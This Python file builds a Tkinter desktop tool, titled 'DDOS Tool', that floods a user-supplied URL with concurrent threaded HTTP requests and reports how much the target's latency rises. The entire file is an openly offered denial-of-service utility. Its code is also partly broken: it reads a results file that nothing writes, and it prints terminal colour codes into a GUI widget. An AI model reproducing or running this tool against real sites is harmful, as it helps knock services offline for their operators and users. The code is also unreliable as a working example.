import requests, json, threading
from time import sleep
import os
import tkinter as tk
from tkinter import scrolledtext, messagebox, font

class bcolors:
    OK = '\033[92m' 
    WARNING = '\033[93m' 
    FAIL = '\033[91m' 
    RESET = '\033[0m' 

def clear_console():
    os.system("clear")

def record(value, result, thread_count):
    result.append(value)
    if len(result) == thread_count:
        with open("result.json", "w") as file:
            json.dump(result, file)

def resulty(stype, result):
    with open("result.json", "r") as file:
        data = json.load(file)
    if stype == 0:
        return data[0]
    elif stype == 1:
        return data[-1]
    elif stype == 2:
        diff = str(int(data[-1].strip("ms"))-int(data[0].strip("ms")))+"ms"
        return diff

def ddos(url, result, i):
    r = requests.get(url)
    if r.status_code == 200:
        i += 1
        result.append(str(int(r.elapsed.total_seconds()*1000))+"ms")
        return f"#{i} {str(int(r.elapsed.total_seconds()*1000))}ms"
    result.append(str(int(r.elapsed.total_seconds()*1000))+"ms")
    return None

def start_ddos(url, thread_count, result_text):
    result = []
    threads = []
    i = 0

    for a in range(thread_count):
        thread = threading.Thread(target=ddos, args=(url, result, i))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    sleep(3)

    result_text.config(state='normal')
    result_text.delete("1.0", 'end')
    result_text.insert('end', f"{bcolors.WARNING} Done\n{bcolors.RESET}")
    result_text.insert('end', f"{bcolors.WARNING} Threads: {len(threads)}\n{bcolors.RESET}")
    result_text.insert('end', f"{bcolors.WARNING} Initial Latency: {resulty(0, result)}\n{bcolors.RESET}")
    result_text.insert('end', f"{bcolors.WARNING} Last Latency: {resulty(1, result)}\n{bcolors.RESET}")
    result_text.insert('end', f"{bcolors.WARNING} Affected Latency: {resulty(2, result)}\n{bcolors.RESET}")
    result_text.config(state='disabled')

# Create main window
root = tk.Tk()
root.title("DDOS Tool")
root.geometry("800x600")
root.configure(bg="#1e1e1e")

# Create custom fonts
title_font = font.Font(family="Helvetica Neue", size=18, weight="bold")
label_font = font.Font(family="Helvetica Neue", size=12)
button_font = font.Font(family="Helvetica Neue", size=12, weight="bold")
text_font = font.Font(family="Courier", size=10)

# Create title
title_label = tk.Label(root, text="DDOS Tool", font=title_font, bg="#1e1e1e", fg="#ffffff")
title_label.pack(pady=20)

# Create frame for input fields
input_frame = tk.Frame(root, bg="#1e1e1e")
input_frame.pack(pady=10)

# URL input
url_label = tk.Label(input_frame, text="URL:", font=label_font, bg="#1e1e1e", fg="#ffffff")
url_label.grid(row=0, column=0, padx=5, pady=5, sticky='e')
url_entry = tk.Entry(input_frame, font=label_font, width=30)
url_entry.grid(row=0, column=1, padx=5, pady=5)

# Thread count input
thread_label = tk.Label(input_frame, text="Thread Count:", font=label_font, bg="#1e1e1e", fg="#ffffff")
thread_label.grid(row=1, column=0, padx=5, pady=5, sticky='e')
thread_entry = tk.Entry(input_frame, font=label_font, width=30)
thread_entry.grid(row=1, column=1, padx=5, pady=5)

# Create text widget to display results
result_text = scrolledtext.ScrolledText(root, wrap='word', width=80, height=20, bg="#2e2e2e", fg="#ffffff", font=text_font, bd=0, relief="sunken")
result_text.pack(padx=10, pady=10, fill="both", expand=True)

# Button to start DDOS test
start_button = tk.Button(root, text="Start DDOS Test", command=lambda: start_ddos(url_entry.get(), int(thread_entry.get()), result_text), bg="#007acc", fg="#ffffff", font=button_font, relief="flat", overrelief="raised", padx=20, pady=10)
start_button.pack(pady=10)

# Button to clear results
clear_button = tk.Button(root, text="Clear Results", command=lambda: result_text.delete("1.0", 'end'), bg="#007acc", fg="#ffffff", font=button_font, relief="flat", overrelief="raised", padx=20, pady=10)
clear_button.pack(pady=10)

root.mainloop()
